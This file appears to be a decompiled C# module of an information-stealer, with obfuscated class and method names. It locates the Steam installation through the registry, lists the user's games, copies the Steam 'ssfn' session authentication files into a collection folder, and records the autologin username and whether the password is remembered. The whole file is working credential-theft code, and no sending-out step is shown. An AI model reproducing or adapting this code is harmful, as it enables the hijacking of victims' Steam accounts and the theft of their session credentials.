using System.IO;
using Microsoft.Win32;
using ns13;

namespace ns7;

internal sealed class Class28
{
	public static bool smethod_0(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null)
			{
				return false;
			}
			string path = registryKey.GetValue("SteamPath")!.ToString();
			if (!Directory.Exists(path))
			{
				return false;
			}
			Directory.CreateDirectory(string_0);
			string[] subKeyNames = registryKey.OpenSubKey("Apps")!.GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text);
				string text2 = (string)registryKey2.GetValue("Name");
				text2 = (string.IsNullOrEmpty(text2) ? "Unknown" : text2);
				string text3 = (((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No");
				string text4 = (((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No");
				string text5 = (((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No");
				File.AppendAllText(string_0 + "\\Apps.txt", "Application " + text2 + "\n\tGameID: " + text + "\n\tInstalled: " + text3 + "\n\tRunning: " + text4 + "\n\tUpdating: " + text5 + "\n\n");
			}
			subKeyNames = Directory.GetFiles(path);
			foreach (string text6 in subKeyNames)
			{
				if (text6.Contains("ssfn"))
				{
					File.Copy(text6, string_0 + "\\" + Path.GetFileName(text6));
				}
			}
			Class54.bool_1 = true;
			string text7 = (((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No");
			string contents = string.Format("\nAutologin User: " + registryKey.GetValue("AutoLoginUser")?.ToString() + "\nRemember password: " + text7);
			File.WriteAllText(string_0 + "\\SteamInfo.txt", contents);
			return true;
		}
		catch
		{
			return false;
		}
	}
}
